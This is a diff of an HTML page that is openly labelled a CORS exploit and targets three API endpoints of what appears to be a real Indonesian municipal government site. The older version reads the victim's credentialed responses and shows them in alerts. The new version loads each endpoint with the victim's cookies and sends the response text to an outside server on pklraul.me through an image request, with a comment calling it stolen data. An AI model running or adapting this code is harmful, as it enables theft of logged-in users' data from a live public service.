@@ -2,97 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit Test for pakmo.mojokertokota.go.id</title>
+    <title>CORS Exploit</title>
 </head>
 <body>
-    <h1>Testing CORS Exploit on pakmo.mojokertokota.go.id with pklraul.me</h1>
-
+    <h1>CORS Exploit Test</h1>
     <script>
-        // Fungsi untuk mengirim GET request ke endpoint /api/notifications?page=1&page_size=10
-        function testGetNotifications() {
-            let targetURL = "https://pakmo.mojokertokota.go.id/api/notifications?page=1&page_size=10";
-
-            fetch(targetURL, {
-                method: 'GET',
-                credentials: 'include', // Sertakan kredensial seperti cookie
-                headers: {
-                    'Origin': 'https://pklraul.me', // Mengirimkan asal dari pklraul.me
-                    'Accept': 'application/json, text/plain, */*',
+        // Function to send requests and log results
+        function exploitCORS(apiURL) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", apiURL, true);
+            xhr.withCredentials = true; // Send cookies/credentials with request
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log("Response from " + apiURL + ": " + xhr.responseText);
+                    // Send stolen data to your server on pklraul.me
+                    var img = new Image();
+                    img.src = "https://pklraul.me/log?data=" + encodeURIComponent(xhr.responseText);
                 }
-            })
-            .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error('Request failed');
-                }
-            })
-            .then(data => {
-                console.log('Response from /api/notifications:', data);
-                alert('Data from /api/notifications: ' + JSON.stringify(data)); // Menampilkan data dari target dalam alert box
-            })
-            .catch(err => console.error('Error:', err));
+            };
+            xhr.send();
         }
 
-        // Fungsi untuk mengirim GET request ke endpoint /api/home/services?page=1&page_size=10
-        function testGetServices() {
-            let targetURL = "https://pakmo.mojokertokota.go.id/api/home/services?page=1&page_size=10";
+        // List of vulnerable URLs to exploit
+        const urls = [
+            "https://pakmo.mojokertokota.go.id/api/home/statistic",
+            "https://pakmo.mojokertokota.go.id/api/home/services?page=1&page_size=10",
+            "https://pakmo.mojokertokota.go.id/api/notifications?page=1&page_size=10"
+        ];
 
-            fetch(targetURL, {
-                method: 'GET',
-                credentials: 'include', // Sertakan kredensial seperti cookie
-                headers: {
-                    'Origin': 'https://pklraul.me', // Mengirimkan asal dari pklraul.me
-                    'Accept': 'application/json, text/plain, */*',
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error('Request failed');
-                }
-            })
-            .then(data => {
-                console.log('Response from /api/home/services:', data);
-                alert('Data from /api/home/services: ' + JSON.stringify(data)); // Menampilkan data dari target dalam alert box
-            })
-            .catch(err => console.error('Error:', err));
-        }
-
-        // Fungsi untuk mengirim GET request ke endpoint /api/home/statistic
-        function testGetStatistic() {
-            let targetURL = "https://pakmo.mojokertokota.go.id/api/home/statistic";
-
-            fetch(targetURL, {
-                method: 'GET',
-                credentials: 'include', // Sertakan kredensial seperti cookie
-                headers: {
-                    'Origin': 'https://pklraul.me', // Mengirimkan asal dari pklraul.me
-                    'Accept': 'application/json, text/plain, */*',
-                }
-            })
-            .then(response => {
-                if (response.ok) {
-                    return response.json();
-                } else {
-                    throw new Error('Request failed');
-                }
-            })
-            .then(data => {
-                console.log('Response from /api/home/statistic:', data);
-                alert('Data from /api/home/statistic: ' + JSON.stringify(data)); // Menampilkan data dari target dalam alert box
-            })
-            .catch(err => console.error('Error:', err));
-        }
-
-        // Jalankan ketiga fungsi untuk mengirim request ke masing-masing endpoint
-        testGetNotifications();
-        testGetServices();
-        testGetStatistic();
+        // Execute the exploit for each URL
+        urls.forEach(url => exploitCORS(url));
     </script>
-
 </body>
 </html>
